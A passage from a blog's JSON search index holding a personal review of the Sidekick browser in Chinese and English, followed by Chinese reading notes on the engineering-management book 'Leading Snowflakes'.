已內建了上百個生產力工具網站，可快速加入 Application。 如果從首頁加入 Application 後沒出現在左方 Sidebar 可以自行拖曳過去。在 Application 按右鍵可快速查看最近瀏覽、另外也支援多帳號切換。 多帳號切換支援的網站不太多，不支援只能先用 Private Mode (無痕模式)；目前測試 Slack、Notion 都支援。 左方 Application 與上方 Tab 互不影響，Application 區塊是獨立的不會出現在上方 Tab。每個 App 都可個別進行設定，例如關閉通知、關閉 Badge 等等。視窗分割功能雖然 MacOS 自帶視窗分割功能，但我其實很少使用；除非是想要完全進入專注狀態，更多時候的需求是要同步對照網頁內容+使用其他 MacOS App 做事，這時候純瀏覽器的分割視窗功能就很實用！例如，這樣就可以邊上線上課＆做筆記。中間分隔大小可以自由拖曳調整。使用方法，只要點擊瀏覽器右上角的分割視窗按鈕，選擇要加入左方的視窗即可，再點一次就會關閉分割。Spotlight 功能類似 MacOS 的 Spotlight，在任何視窗都能按下「Option」+「f」做全瀏覽器搜尋。 可以使用「Option」＋「z」或「Control」+「tab」進行 Tab 的快速切換 「Option」＋「1–9」快速切換位置 1~9 的TabTab Saver (Save Sessions) 功能同 Chrome 上很流行的 Tab Saver 擴充功能，能快速儲存目前已打開的 Tab 網頁，並且能在其中做切換，方便我們管理工作的不同狀態。點擊左下角的「F」(First Session) 即可進入 Session 管理頁面。點擊上方「Add new session」可以將目前 Tab 狀態儲存下來，開啟全新乾淨的瀏覽環境。可以在 Session 之間切換，點擊「Activate」即可恢復 Tab。 Session 不會影響到左邊啟用中的 Application。 可以使用快捷鍵「Option」+「W」快速進行 Session 切換 「Option」+「⬆️」+「W」進行 Session 管理優秀的 Application 通知功能實際上現在開始，只要有提供 Web 版的通訊服務，都可以直接使用 Sidekick Application 不需特別安裝電腦應用程式；前文有提到 Application 的通知功能就如同電腦應用程式，一樣即時完整。 記得授權 Sidekick 發送電腦端通知；這樣網頁的通知才會在電腦端跳出來提示。筆記功能內建整合 Google Keep 雲端筆記功能，點擊左下方文件 Icon 可快速開啟 Google Keep 做筆記。Google Keep 儲存於雲端 Google 帳號，支援跨平台跨裝置的筆記同步存取。可以使用這個功能快速紀錄事項。 不太確定日後會不會改成自家的 Sidekick Sync，畢竟這樣才有優化整合的空間。 可以使用快捷鍵「Option」+「N」快速進行 Session 切換內建反追蹤反廣告、記憶體管理功能隱私浪潮的來襲，各大企業漸漸開始注重用戶隱私，以 Apple 為最主要領導者，在新版 Safari 中也開始內建隱私保護功能；但作為隱私資訊的最大獲利者 Google 廣告，我想應該很難在 Google Chrome 上看到改變。 Chromium != Chrome，Chromium 是瀏覽器技術核心的開源專案。雖然 Chromium 也是由 Google 主導，但他開源自由原始碼的特性；讓任何開發者都能基於此核心進行優化；Sidekick 也是運用此方法在 Chromium 基礎上進行優化，能同時保留 Chrome 的特點但又能加強 Chrome 缺少的功能。細節 如果是雙螢幕使用者，同樣可以把 Tab 拉成獨立視窗；獨立視窗就不會有左方的工具列。 支援所有 Chrome 擴充功能，可直接到商城下載安裝 更多功能等你來探索體驗！費用 「企業不賺錢是種罪惡 (你不賺錢，是對社會的罪惡，因為我們拿社會的資金，取社會的人才，沒有充足的盈餘，我們在浪費社會可貴資源，這些資源可以在別處更有效地運用。)」- Panasonic 創辦人 — 松下幸之助 (文字參考自商業思維學院)一個好的產品要能有好的現金流，才能提供更好的服務也才能走得更久；以下是 Sidekick 的收費內容：以個人使用來說免費方案啜啜有餘，但如果有能力就不妨贊助一下開發團隊吧！ 目前加入的使用者都是屬於 Early access 方案，貌似不受 Free 方案影響（我 Sidebar apps 超過 5 個也沒事）。 現在邀請 10 位使用者 6 個月 Pro / 邀請 20 位使用者終身 Pro 的方案；所以喜歡本文的朋友可以透過 文內連結進行下載安裝，支持我也支持 Sidekick！使用心得總結這陣子使用下來，因為無痛轉移的緣故；已經完全捨棄 Chrome，也沒有什麼東西是一定要回去用 Chrome 開的，最好用的還是左方的 Applications，可以將工作上常用的網站加入在左方，快速切換處理＆取得最新通知。以往都會迷失在混亂的 Tab 中，或只能使用 Pin Tab 方式把固定重要的工作服務 Pin 在前面；但在切換的時候還是很痛苦，要去尋找。現在我要做 Code Review 時就點 Github、要送審 App 時就點 App Store Connect、要看專案時就點 Asana，工作起來很有效率。記憶體管理的部分，沒有特別做研究測試；不太確定優化效果，但有總比沒有好。 唯一隱憂是這個產品還太新，不太確定能走多遠；如果因為經營不善可能就會停止開發維護了；那會非常可惜！所以請大家大力推廣支持！延伸閱讀 使用 Google Site 建立個人網站還跟得上時代嗎 ？ 使用 iPhone 簡單製作「偽」透視透明手機桌布 Medium 自訂網域功能回歸 ZReviewsBot — Slack App Review 通知機器人有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 7,784 Total Views Last Statistics Date: 2025-08-15 | 7,725 Views on Medium." }, { "title": "Productivity Tools: Embracing the Sidekick Browser Over Chrome", "url": "/posts/zrealm-life/en/productivity-tools-embracing-the-sidekick-browser-over-chrome-118e924a1477/", "categories": "ZRealm Life.", "tags": "sidekick, chrome, chromium, browsers, life", "date": "2021-08-07 13:06:43 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版[Productivity Tools] Embracing the Sidekick Browser Over ChromeAn introduction to th...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版[Productivity Tools] Embracing the Sidekick Browser Over ChromeAn introduction to the features and my experience with the Sidekick browser.2024 UpdateAround early 2023, I switched to using the Arc browser! The experience and features are better, there are fewer bugs, and it supports cross-computer synchronization.Here’s a link to download Arc, the browser I was telling you about!https://arc.net/gift/f86ef8b3IntroductionI learned about the Sidekick browser from a colleague’s recommendation. Honestly, I didn’t have high expectations at first. Over the years, I’ve often thought about abandoning Chrome and have tried using Safari, the beta version of Safari, Firefox, Opera, and various third-party browsers based on open-source cores, but I always ended up returning to Chrome within a few days. One reason for this is that I haven’t actively followed the browser market; perhaps there are already browsers that meet my needs, but I just didn’t know about them.Reasons for FailureThe main reason is that many of my frequently used extensions are not fully supported. I have become too reliant on and accustomed to Chrome’s extensions. Even if a Chromium-based browser can support them without issues, the features often lack standout qualities, making the experience similar to using Google Chrome.My Requirements Chromium core, to support my frequently used extensions More unique features to enhance productivity Support for macOS; I prefer using Safari on iOS, so cross-device support isn’t necessary Excellent memory management Enhanced privacy and anti-tracking features Seamless migration capabilitiesRegarding productivity features, Chrome has millions of extensions available, and I could achieve results by searching and combining them. However, we haven’t conducted any research, so I’m not entirely sure which processes and features are truly beneficial for productivity.About Sidekick Development Team: Sidekick was founded in November 2020 in San Francisco and is currently fundraising. Browser Core: Chromium Current Stage: Early access Core Value: A browser optimized for workflow and productivity Supported Platforms: Windows, macOS, macOS (M1), Linux (deb), Linux (rpm) Extensions: Supports all Chrome Store extensions (Bitwarden, LastPass, 1Password, Grammarly, Google Translate, etc.) Official Website: www.meetsidekick.comDownload and Get Started Click here to visit the official website Click “Download Now” Choose the version that matches your operating system Download and complete the installation Open SidekickUpon opening, you’ll see the Sidekick introduction page. Click “Continue” to proceed.You can sign in using Google, Microsoft, or create a Sidekick account directly. This account is specifically for Sidekick services and is not linked to Google or Microsoft.⬇️⬇️⬇️ If you’re transitioning from Chrome to Sidekick, please read this section before creating your account ⬇️⬇️⬇️ Unlike Chrome, where your login account is directly linked and syncs browser data from your Google account, you’ll find that after logging into Sidekick, no data is imported. This is because Google currently blocks all third-party services from accessing synchronization features, so Sidekick cannot sync or import data directly through your account.User data cannot sync with Google account.Sidekick sync settings, only pathetic search term sync.How to Import Chrome Data?The official method is quite convoluted, but it’s currently the only way.If you are already a Chrome user, you can skip steps 1-3. Download and install Chrome. Sign in to Chrome. Complete the synchronization of your Google account’s browser data to Chrome. Completely close Chrome ( ! Important ! For macOS users, please ensure there are no small dots under the Chrome icon in the Dock) Continue with the account creation from the previous step. After creating your account for the first time, you will be asked which browser you want to import data from. Select Chrome. Wait for the import to complete.Once the import is finished, all bookmarks, browsing history, saved passwords, logged-in website sessions, and extensions will be seamlessly transferred to Sidekick; only a few services may require you to log in again, but most will not, making it a painless transition! There is a small issue here: if you do not create a new account (e.g., reinstalling), you can only import bookmarks, browsing history, and saved passwords; extensions cannot be automatically imported. According to the official Q&amp;A, you will need to reinstall them from the Chrome extension/app store.Sync Issues?Since Google has blocked third-party access to cloud data, how can we solve the bookmark synchronization issue across devices?Sidekick will soon release Sidekick Sync to address this issue. This article uses my personal computer, not for work; therefore, it may include social and entertainment websites, please bear with me.Featured FeaturesSeamless MigrationAs mentioned in the installation steps, after the first installation, opening and creating an account allows you to seamlessly transfer all bookmarks, browsing history, saved passwords, logged-in website sessions, and extensions from existing browsers like Safari, Chrome, or Edge.The logged-in website sessions and extensions provide the best experience; previous browsers only transferred bookmarks, requiring you to log in to all websites and reinstall all extensions, which can be very frustrating.Powerful Homepage FeaturesUnlike Chrome’s monotonous homepage, Sidekick comes with a beautiful and convenient homepage feature without needing to search for a solution. The search box can search browsing history and bookmarks; if there are no results, it automatically defaults to Google search. Displays data on anti-tracking, memory management, and ad-blocking in the upper left corner. Shows today’s date and current time. The upper section is referred to as Tabs, while the upper left tool bar is called Applications. The homepage background can be customized or automatically display scenic images.Application FeatureNot just a quick access point for websites, the Application feature works similarly to macOS’s Dock. When a website is activated, it stays in the browser (indicated by a small dot on the left) while also managing memory effectively; if the website has notifications, it will display a numerical reminder.Applications can be quickly added from the homepage or created from Tabs by manually entering URLs or icons.Sidekick has built-in hundreds of productivity tool websites that can be quickly added to Applications. If an Application added from the homepage does not appear in the left sidebar, you can drag it over yourself.Right-clicking on an Application allows you to quickly view recent browsing history, and it also supports multiple account switching. Not many websites support multiple account switching; if not supported, you can use Private Mode (Incognito Mode); currently, Slack and Notion have been tested and support this feature. The left Application and the upper Tabs do not interfere with each other; the Application section is independent and will not appear in the upper Tabs.Each App can be individually configured, such as turning off notifications or badges, etc.Split Window FeatureAlthough macOS has a built-in split window feature, I rarely use it; unless I want to focus completely, I often need to compare web content while using other macOS apps. In such cases, the pure browser split window feature is very useful!For example, you can attend an online class and take notes simultaneously.The size of the split can be freely adjusted by dragging.To use it, simply click the split window button in the upper right corner of the browser and select the window you want to add to the left side; clicking it again will close the split.Spotlight FeatureSimilar to macOS’s Spotlight, you can press “Option” + “f” for a full browser search in any window. You can use “Option” + “z” or “Control” + “tab” for quick Tab switching. “Option” + “1–9” allows quick switching to Tab positions 1-9.Tab Saver (Save Sessions) FeatureSimilar to the popular Tab Saver extension on Chrome, this feature allows you to quickly save currently opened Tab pages and switch between them, making it easier to manage different work states.Click the “F” (First Session) in the lower left corner to access the Session management page.Click “Add new session” at the top to save the current Tab state and open a new clean browsing environment.You can switch between Sessions by clicking “Activate” to restore the Tabs. Sessions will not affect the Applications that are currently activated on the left. You can use the shortcut “Option” + “W” for quick Session switching. “Option” + “⬆️” + “W” for Session management.Excellent Application Notification FeatureNow, as long as there is a web version of a communication service, you can use the Sidekick Application without needing to install a separate desktop application; as mentioned earlier, the Application’s notification feature works just like a desktop application, providing real-time notifications. Remember to authorize Sidekick to send desktop notifications; this way, web notifications will pop up on your computer.Note-Taking FeatureBuilt-in integration with Google Keep allows you to quickly open Google Keep for note-taking by clicking the document icon in the lower left corner.Google Keep is stored in the cloud on your Google account, supporting cross-platform and cross-device note synchronization.You can use this feature to quickly jot down notes. I’m not sure if they will eventually switch to their own Sidekick Sync, as that would allow for better optimization and integration. You can use the shortcut “Option” + “N” for quick Session switching.Built-in Anti-Tracking, Ad-Blocking, and Memory Management FeaturesWith the rising tide of privacy concerns, major companies are starting to pay attention to user privacy, with Apple leading the way. The latest version of Safari has also begun to include privacy protection features; however, as the biggest beneficiary of user privacy information, I doubt we will see changes in Google Chrome. Chromium != Chrome; Chromium is an open-source project that serves as the core technology for browsers.Although Chromium is also led by Google, its open-source nature allows any developer to optimize based on this core. Sidekick utilizes this method to enhance Chromium, retaining Chrome’s features while also strengthening the functionalities that Chrome lacks.Details If you are a dual-monitor user, you can also pull Tabs into independent windows; independent windows will not have the left tool bar. Supports all Chrome extensions, which can be directly downloaded and installed from the store More features await your exploration and experience!Pricing “It is a sin for a business not to make money (if you are not making money, it is a sin against society, because we take society’s resources and talent; without sufficient surplus, we are wasting valuable resources that could be used more effectively elsewhere.)” - Panasonic Founder — Konosuke Matsushita (Text reference from the Business Thinking Academy)A good product needs to have good cash flow to provide better services and sustain itself longer. Here are the pricing details for Sidekick:For personal use, the free plan is more than sufficient, but if you have the means, consider supporting the development team! Currently, all users who have joined are on the Early Access plan, which seems unaffected by the Free plan (I have over 5 Sidebar apps and it’s not an issue). There’s a plan to invite 10 users for 6 months of Pro access, or invite 20 users for lifetime Pro access; so if you enjoy this article, you can download and install through this link to support me and Sidekick!Summary of ExperienceAfter using it for a while, I’ve completely abandoned Chrome due to the seamless transition; there’s nothing I absolutely need to go back to Chrome for. The best feature is the Applications on the left side, where I can add frequently used work websites for quick switching and to receive the latest notifications.In the past, I would often get lost in a chaotic sea of tabs, or I could only pin important work services to the front using the Pin Tab feature; but switching between them was still painful as I had to search for them.Now, when I need to do a Code Review, I just click on GitHub; when I need to submit an app, I click on App Store Connect; and when I want to check a project, I click on Asana. This has made my work much more efficient.As for memory management, I haven’t done any specific research or testing; I’m not sure about the optimization effects, but having some management is better than none. The only concern is that this product is still quite new, and I’m not sure how far it can go; if it fails to sustain itself, development and maintenance might stop, which would be a real shame! So please promote and support it vigorously!Further Reading Is using Google Sites to create a personal website still keeping up with the times?? How to easily create a “pseudo” transparent phone wallpaper using an iPhone Medium’s custom domain feature returns ZReviewsBot — Slack App Review Notification BotIf you have any questions or feedback, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 7,784 Total Views Last Statistics Date: 2025-08-15 | 7,725 Views on Medium." }, { "title": "Leading Snowflakes 閱讀筆記", "url": "/posts/leading-snowflakes-%E9%96%B1%E8%AE%80%E7%AD%86%E8%A8%98-1c9eafd4a190/", "categories": "", "tags": "management, leadership, engineering, 管理學, 工程師", "date": "2021-07-25 15:44:20 +0800", "snippet": "Leading Snowflakes — 閱讀筆記“Leading Snowflakes The Engineering Manager Handbook” — Oren Ellenbogen管理職，初來乍到，一切都很迷茫；對於管理的知識只有彙整之前的工作經驗、觀察或與其他同事閒聊時獲得，知道主管做了什麼事底下的人是正面的、什麼事是負面的；也就大概只有這些經驗想法，知識是破碎的，沒有一個有系...", "content": "Leading Snowflakes — 閱讀筆記“Leading Snowflakes The Engineering Manager Handbook” — Oren Ellenbogen管理職，初來乍到，一切都很迷茫；對於管理的知識只有彙整之前的工作經驗、觀察或與其他同事閒聊時獲得，知道主管做了什麼事底下的人是正面的、什麼事是負面的；也就大概只有這些經驗想法，知識是破碎的，沒有一個有系統理念，於是我開始看書，開始記錄一下每個作者的經驗；如果遇到相同的事物，有了「知識底氣」之後就不會在手忙腳亂了。Leading Snowflakes 語言：英文 作者：Oren Ellenbogen 出版年份：2013 官方網站 感謝 海總理 推薦作者在過去近 20 年的工作經歷中，從原本的軟體工程師一步步踏入管理職；擔任過不管是大公司或新創公司之 Technical Lead、Engineering Manager；本書詳細點出從工程師踏入管理職時會遇到的瓶頸及該用什麼方法整理、解決。我覺得與我的背景非常相似，都是本來做軟體開發，初探管理職；藉由書中提到的重點讓我學到很多可以怎麼做的方法！ - 本文僅為個人筆記夾雜些許個人觀點，在這資訊碎片化的年代，強烈建議要自行閱讀過原文書，才能有系統的吸收精髓。 - 筆記的意義是之後回頭來看，比較容易快速定位到想複習的點。 - 部分內容直接摘錄原文。Lesson 1. — Switch between “Manager” and “Maker” modes從工程師(Maker)到管理者(Manager)的過渡。完成好任務甚至優雅地解決難題是優秀的工程師的衡量標準，但做為管理者以不是用完成任務的能力來衡量，這部分我們已經證明過了，而是以帶領、推動、提升能力的團隊目標作為評斷標準。但也不能完全將自己從任務中抽離，完全與任務細節抽量導致與團隊成員斷開連結，對於執行成果、優先權、信任方面長期來看會有很大的風險。所以不是說當管理者就不用做工程師的事，而是兩邊都要碰，需要的就在 工程師(Maker) 跟 管理者(Manager) 之中取得平衡。做為工程師時我們喜歡有連續不被打斷的時間讓我們保持在 Context 中去解決困難的問題；但做為管理者時，我們需要的是時常跳出來幫助團隊、關心隊友，所以被打斷其實是管理者的工作之一。但我們同時需要身兼工程師和管理者，那該如何是好？作者建議建立兩個 Calendar ，一個是 as Maker (工程師)、一個是 as Manager (管理者)，然後每日一大早給自己 15 – 30 分鐘整理思緒，安排本日行事曆，該做什麼事、有什麼會、有哪些空檔的連續時間點可以拿來解決任務(as Maker)。作者的行事曆範本我們也需要專心的時間作者所述，現在身為管理者，但我們仍需同時處理任務；可利用的空檔專注時間對我們來說比以前更重要。作者提到，可以在需要專心的時間透過一些動作傳達給隊友，暫時不要打擾我！方法有：到會議室、戴上耳機、或甚至買一個 ON AIR ! 的開關燈放桌上。如果不是緊急問題，可以先請隊友留言或彙整資訊寄信給你，等到專心時間結束後再來處理。評估自己做為工程師的時間能解決的任務因為已經不像以前純當工程師(Maker)的時候可以全心全力灌注在開發需求上，所以要依照工程師行事曆所能運用的時間來選擇能親自執行的任務。不要成為團隊的技術瓶頸，我們的任務是提升團隊能力、探索新技術、提升公司對外或隊內的技術視野；可做的事有預先研究技術問題，然後與隊友分享並交由隊友執行、解決公司技術債、流程問題增加開發效率、使用新技術、將公司技術開源、開放 API、對外黑客松…等等。最重要的還是平衡作者建議可以從 15–20% 比例開始調配，本來是 100% as Maker，現在可能是 20% as Maker / 80% as Manager（但這要看實際團隊大小及成員能力，作者也說 50% / 50% 也有可能），就是不能在是 100% 投入工程開發，要多花心力在管理上。善用 1:1定期與隊友 1:1，互相 Feedback 並分享所學到的東西。如果管理者的任務吃掉你所有時間作者最後提到，如果你管理的任務太多完全無法做工程 (as Maker)的事，與任務、技術脫節時，可以考慮每週選幾天 WFH 與公司隔離或參加黑客松。Lesson 2. — Code Review” Your Management Decisions定期 Review 你身為管理者下的決策。身為工程師時我們有很多方法或工具，只要遵循就能提升好能力，諸如 pair programming、code review、design pattern；但做為管理者，尤其菜鳥我們感到相當孤獨。我們不想承認對上或對下一無所知、害怕為團隊成功負責也擔心沒拿捏好技術(債)與商業需求之間的平衡。作者提到要跨出去尋找提升管理能力的，公開徵求 Feedback &amp; 提高管理技能的方法；做管理者時也能像做工程師時的熱情。記錄＆回頭審查決定同事與老闆都是我們很常低估的強大資源，我們可以快速的從同事與老闆的 Feedback 中學習；建立好紀錄＆回頭審查決定的習慣，可以讓我們更好的得到 Feedback。作者提到： 「There is no one right way, there are only tradeoffs.」我想也是，如果不是進退兩難的問題應該也不會問你；如果問你就代表隊友不知道該如何決定。我們可以列出選項並提供決定給隊友，但與此同時也要記下所做的決定。作者提供的紀錄 Sheet 範本養成紀錄的習慣，並且要確保內容是之後能回憶的。作者建議，每個月回頭審查，可以與老闆或其他管理者或其他同事分享討論決策（至少要分享一半的問題），聽聽別人的看法；可以匿名保護當事者，對事不對人，並記錄下來。回頭審查時的要點關於問題： 引起多少技術問題？ 是個人問題？ 只是某個成員的獨立問題？（是不是單純只是他不了解目標？） 這問題在其他團隊或會重複出現嗎？關於決策： 這問題真的需要管理者來決定嗎 有沒有問過隊友的建議 有沒有其他比較有經驗的人能提供建議 現在重新思考，還會是同個決定嗎？Lesson 3. — Confront and challenge your teammates推動隊友跳脫舒適圈以及不讓自己變成混蛋跟陷入陷阱。作者提到一開始很不習慣，因為本來是朋友的同事現在變成部署；他害怕會傷害本來的關係；所以一昧地承擔所有收尾的事，但最後他發現他越是保護越與隊友距離越遠，因為他一而再的埋頭苦幹，少了分享讓隊友失去信念。回頭來看，作者說與其害怕傷害隊友的感覺不如說出內心真實所想的，「害怕傷害隊友」這單純是自己自私的想像，沒有必要；而且這是身為管理者的責任，帶領團隊成長前進；要遠觀大局、控制風險。分享真實想法對雙方都很難，但這是身為管理者的責任。 vs 同情心(Sympathy)”)我們要展現同理心而不是同情心，為了讓他們的工作真正出類拔萃，他們需要我們客觀的意見。作者提供以下三個要項讓我們能在情緒與行爲中做出平衡： 我有展現出同理心嗎？ 我有清楚說明我的期待嗎？ 我有以身作則嗎？ 「If you want to achieve anything in this world, you have to get used to the idea that not everyone will like you.」 如果你想要有所成就，就必須習慣不會每個人都喜歡你的想法四個常見的陷阱： 相較於掩蓋，我有公開分享失敗經驗嗎？（可以是寫文章、寄信給所有人） 忘記統整討論結果（要習慣紀錄 1:1、討論的結果） 使用錯誤的 Feedback 媒介，沒得到真正的問題（依照團隊文化找到適合的 Feedback 渠道，EX: 1:1） 不即時的 Feedback我們需要注意，工程師喜歡挑戰自我、提升技能，同時也想要獲得尊重、主管的 Feedback；我們的任務就是帶領團隊成長，所以在每次有 Feedback 機會時不應該拖延，因為不做決定也等同於做決定；而且一旦 Feedback 的風氣衰弱之後要再點燃就更困難。Summary可以花時間寫下激勵隊友的方法及詢問主管是否太保護隊友？Lesson 4. — Teach how to get things done如何以風險較低的方式完成任務。以身作則是不錯的方法，時不時參與團隊的開發示範如何計畫、產出好的功能展現我們想傳達的理念；另外要注意，在這其中要多説 Why? (為何這樣做)、少說 How? (該怎麼做)作者提到極度透明的文化，讓團隊成員有完整的 Context 能提高推動決策的能力。降低風險 為了降低產出的風險，作者建議將需求拆成許多小塊迭代功能；並將此想法與其他 Team 溝通分享。 Scale and performance — always have a backup plan這功能會不會影響效能(或造成其他問題)？可以提前知道嗎？有沒有備案(開關)；在沒有備案之前寧可不要實作，因為會影響團隊信心。 將任務拆解成小任務，降低 Deadline 風險一開始可能很難，但可以訓練學習 善用同儕壓力將任務拆給隊友共同協作，彼此共同努力(Code Review 亦也是) 持續對內及對外溝通對內：確保期望、同步、Deadline、資源，對外：溝通、如果時間很趕了可推掉不重要會議 支援、修 Bug、文件不是釋出功能就好，還要做好客服支援、修 Bug、還有文件 做好回顧及委派任務，提供其他人領導機會 挑選幾個能以身作則的 Task 詢問隊友學到的東西、能讓他更積極的動機、討厭的事Lesson 5. — Delegate tasks without losing quality or visibility委派任務的同時又不喪失品質跟能見度。身為管理者必須做好任務委派，作者認為委派就該設定好期待並相信被指派的隊友有能力執行並是有機會學到東西及保有發生錯誤的空間，管理者另一方面也要保護隊友來自公司的壓力。作者使用以下表格進行記錄：這邊主要紀錄的是對團隊目標重要的任務，日常工作不用紀錄。 Must 寫下任務內容對於是否要將任務委派給隊友，作者會先問這個任務是否真的只有我能做且是屬於管理者該做的事，第二個是這個任務是否是長遠的領導任務；如果都不是則委派隊友執行。對於要委派的任務可評估隊友的經驗、技能，找到合適的人選。 External 關於外部或上面期待的資源 (Feedback/Tool) DelegateDelegate 的部分，我們可以提供一頁的 Paper 闡述我們的期待、簡單的範例。Lesson 6. — Build trust with other teams in the organization團隊與團隊兼協作的默契。作者闡述，組織為了能做更多事會拆分很多小組進行快速決策處理；對於各小組的方向定義其實不難(EX: iOS 就是做 iOS App)，難的是要對齊所有小組的目標。小組越多就很難統一所有人的價值觀、期望、優先權、隱含的期望。應該要關注拆分小組的理由跟動機而非產出，否則可能導致矛盾。作者認為要對齊各小組的方向有以下方法： 團隊要有願景，而不是只把任務處理好 管理者需要區分出需要與想要 優化團隊更快的完成正確的事而不是完成更多的事 與其他團隊經理建立良好的溝通作者建議可以在每兩週的管理者會議分享團隊內的狀態、分享自己團隊阻礙與痛苦、接下來會做的主要任務、做的原因 與其他團隊對於優先權意見不同時，可解釋引出其他因素（EX: 這個做了之後，可以降低 CS 客訴、一勞永逸、加乘效果…） 先了解外部團隊需要我們幫忙的地方並且主動密切追蹤 再來提出我們團隊需要外部團隊幫忙的點 列好需要確認的清單，確保在會議上有討論到；如果沒有可以在會後拉相關的經理討論看有沒有其他可能 若不可能則要權衡可能會延遲時間或替代方案，並要讓關係人知道（防止在背後指指點點） 一切都是權衡另外還有 5 個讓隊友能與其他團隊建立密切關係的方法： 簡單的感謝信（感謝協助） 交換團隊工作 內部技術年會，互相分享 一起觀察使用者使用狀況，一起腦力激盪提出優化方向 邀請一位其他 Team 的隊友加入我們的工作Summary 「 imagine that someone from Team A drops a feature that Team B needs, due to an urgent support issue. Without communicating this priority change to Team B, trust will be decreased even if it’s a justified priority change.」「 difference between transactional trust and relational/emotional trust 」 了解交易信任與關係信任。 交易信任 — — 人們是否會履行承諾並完成任務 關係信任 — — 人們是否以建立和保護關係的方式行事Lesson 7. — Optimize for business learning建立商業學習文化而不是建造文化、優化吞吐量、優化的價值。 過早的優化是災難 優化當前問題為重，不要為了優化而優化 即使不是整個專案的負責人，我們仍可就內部運作進行優化，大的成功多半來自小部分的優化累積 身為管理者我們必須展現決策背後的動機 建立商業學習(價值)文化大與建造文化（重點不是建造解法，而是我們試圖解決的商業問題） 優化效率 vs 優化吞吐量問題：優化效率：解決單一 task 的時間優化吞吐量：一個時間範圍內(EX: 一季) 能解決多少 task 知道每個優化的 Impact， 自動化的重要（能一勞永逸節省時間）使用 AARRR 原則為價值優化： Acquisition：如何引入更多使用者 Activation：如何引導使用者完成讓他了解產品價值的任務（EX: 鬧鐘 App，新手引導他完成設立一個鬧鐘） Retention：提升回訪率，回來使用次數 Referrer：讓你的使用者、內容，帶來更多流量 Revenue：數字化評估使用者帶來的收入這五項息息相關，如果因為 Retention 低，可能可以同步調整 Referrer、Acquisition。身為工程管理者，我們要做的不是埋頭寫 Code 或是全心投入在技術；時不時應該要重新對齊產品價值。當產品還在草創初試市場狀態時，應該要以優化效率(快速解決任務釋出)為主，重複著以下流程：功能能提升 Retention -&gt; 釋出功能 -&gt; 學習 -&gt; 調整＆重複。評估功能到釋出每個階段可以優化的地方（花太多時間在設計？在討論？）可以投資 20% 時間減少 80% 的開發時間嗎？尤其是令人痛苦的點可以先實驗或發布給最小受眾嗎？避免功能很大包結果最後沒人用。 要做好數據追蹤，才能了解努力的成效 「If you can’t make engineering decisions based on data, then make engineering decisions that result in data.”」雖然相較「這功能不做，公司會倒閉」跟「這功能會導致技術債」，前者當然更可怕；對於技術債，作為管理者如果能爭取更多時間解決我們應該就要做到，我們應該要做好溝通及控管。優化可能不會用到的程式意義不大。 過了草創試驗期，產品模式趨於穩定；這時候比較適合優化的是吞吐量(EX: 給定 X 資源，得到 Y 產出) 給予商業需求可預測性(同上)追蹤團隊產出 (EX: 「01/01/2013–14/01/2013: 2 Large features, 5 Medium features, 4 Small )，經過長期統計；可以藉此提供預測。找出＆解決瓶頸： 同步的溝通：例如產品開發流程，需要設計資源；在進到工程開發階段，我們是否已經有明確的規格可執行開發？還是在等待？還是有什麼我們可以先做的？ 基礎設施：讓程式碼好擴充、好維護 自動化：使用自動化處理繁瑣的人工操作，節省時間之餘也能避免出錯因為商業策略隨時在改變，我們應該對於優化策略保有更開放彈性的想法，優化的總結還是以商業需求為主。Lesson 8. — Use Inbound Recruiting to attract better talent關於招募。平時就要開始做以下事項，防止突然缺人才要開始，那只能回到傳統找人方式，不停的面試但卻很難找到合適的人。對內： 培養良好的工程文化環境 (EX: Code Review、年會…) 打造吸引人的工作環境 像經營品牌一樣 團隊成員共同努力 加強人與人的連結（EX: 慶生） 先讓成員是對團隊感到驕傲的對外： 內部團隊每週定時對外回答社群問題 (EX: Stackoverflow. . )，加強曝光 在程式中隱藏招募彩蛋(EX: 網頁開發者工具) 與社群分享我們團隊遇到的問題及解決方法（文章 or Talk） 舉辦黑客松 建立 Side Project (EX: 開源專案)分配以上各任務給團隊成員，大家一起為找到好人才貢獻一份心力。Lesson 9. — Build a scalable team打造可擴充的團隊。建立可擴充程式以是我們之前擔任工程是該有的職責，但現在要挑戰的是打造可擴充團隊。不像程式，人有期待、需要、夢想要顧及。作者想要打要一個快樂的工作環境、隊友之間了解任務的期待、新挑戰；而且要能持續保持這份熱情。 對齊目標對齊個人願景與公司目標，如果不了解當前公司的目標很可能造成團隊功能失調。 對齊核心價值算是共識及默契，對於做事方式、什麼重要的默契；團隊核心價值也不是一成不變，要與時俱進。 平衡對於團成員的職能、成長，分配不同的願景、自主權、擁有全；互相協作一起成長(EX: 新人只期待能了解公司做事流程，老鳥要 Code Review、指導)；每個人都應該要有成長性。 團體的核心價值觀大於個體可能導致有人離職，也需要時間耐心才可能實現；也有許多挑戰 (EX: 有人離職時會質疑核心價值) 成就感成果要能有成就感，做為管理者不能讓隊友干燒熱情實踐1. 定義團隊願景EX: 作者的團隊是做爬蟲的，他的團隊願景就是「To build the largest, most informative profile-database in the world.」請注意是願景，不是短期目標也不想做的事。2. 定義團隊核心價值在挑選核心價值時可以「這個價值重要到會因為沒有而開除某人嗎？」寫下核心價值、原因。作者提供以下幾個他寫的核心價值：- 不要讓別人(其他團隊)來收拾善後，自己(團隊)的錯誤自己要承擔- 對團隊所有成員保持忠誠尊重有了核心價值在招募或開除更有評斷準則，還有更能有做事的基準。定義成員對團隊對管理者的期待 提供具有生產力且開心的工作環境 知道 Task 的 Why 而不是 How 能夠得到真實的 Feedback 有機會帶領其他成員 能夠分享工作成果定義對團隊成員的期待基本期待： 完成任務 保持學習熱忱 保持分享、教學熱忱 知道做事的底線 sense個人期待： 依照能力設定期待 有能力訓練他人改變 推動改變而不是抱怨我們是團隊，團隊成員有自己的責任跟要交付的成果，同時也要與其他人協作，幫助他人，互相成長；定義期待像是種契約，在原本的同事關係變成管理者關係之下，能更好更有目的的領導；定義這些項目不容易，需要時間、耐心去迭代。 「You can’t empower people by approving their actions. You empower by designing the need for your approval out of the system.」有任何問題及指教歡迎 與我聯絡 。本文首次發表於 